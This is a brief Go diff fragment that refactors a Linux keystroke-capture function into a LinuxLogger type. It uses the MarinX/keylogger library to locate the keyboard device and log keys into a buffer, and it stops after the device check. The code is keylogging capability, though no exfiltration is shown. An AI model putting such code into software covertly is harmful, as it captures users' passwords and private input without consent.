@@ -7,7 +7,14 @@ import (
 	"github.com/MarinX/keylogger"
 )
 
-func CaptureKeyboardKeysLinux(logBuffer *bytes.Buffer) {
+type LinuxLogger struct {
+}
+
+func NewLinuxLogger() *LinuxLogger {
+	return &LinuxLogger{}
+}
+
+func (l *LinuxLogger) CaptureKeyboardKeys(logBuffer *bytes.Buffer) {
 	device := keylogger.FindKeyboardDevice()
 	if device == "" {
 		log.Fatal("No keyboard found...")
